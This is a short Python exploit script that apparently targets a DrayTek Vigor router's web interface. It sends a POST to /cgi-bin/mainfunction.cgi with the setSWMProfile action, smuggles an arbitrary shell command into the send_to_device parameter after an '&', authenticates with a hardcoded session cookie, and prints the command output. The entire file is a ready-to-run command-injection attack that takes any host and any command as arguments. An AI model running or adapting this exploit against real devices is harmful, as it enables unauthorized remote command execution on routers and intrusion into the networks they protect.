import argparse
import requests
 
cookie_value = "7:4C5E0E853A33FBBB89EF4F7FAAF4EEB6"
cookies = {
    "SESSION_ID_VIGOR": cookie_value
}

def remove_duplicate(input_str):
    length = len(input_str)
    
    if length % 2 == 0 and input_str[:length//2] == input_str[length//2:]:
        return input_str[:length//2]
    else:
        return input_str


def system(host,cmd):
    cmd = "&"+cmd
    try:
        headers = {
            "HOST":host,
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
            "Content-Type": "text/plain; charset=UTF-8",
            "Accept": "*/*",
            "Referer": f"http://{host}/",
            }
        url = "http://"+ host + "/cgi-bin/mainfunction.cgi"
        # action = "get_subconfig"
        # data = f"action={action}&getlocal=xxx&rtick={cmd}&config=ipv6_neigh&rfilter=1&rvalue=1&sectiontype=2&default_value=3&rtick=1724827664524"
        data = {
            "mac_addr": "1",
            "action": "setSWMProfile",
            "send_to_device": cmd,
            "apply_page": "1",
        }
        res = requests.post(url=url, data=data,headers=headers,cookies=cookies,verify=False)
        if res.status_code == 200 and res.text != "":
            print("[+] Command executed successfully")
            result = remove_duplicate(res.text)
            print("[+] Result: \n" + result)
            return res.text
        else:
            print('[-] Command execute failed! Nothing...')
            return 1
    except Exception as e:
        print('[-] Command execute failed!')
        print(e)
 
 
if __name__ == "__main__":
    # 获取第一个参数作为目标地址，第二个命令行参数作为命令
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="target host")
    parser.add_argument("cmd", help="command to execute")
    args = parser.parse_args()
    system(args.host, args.cmd)

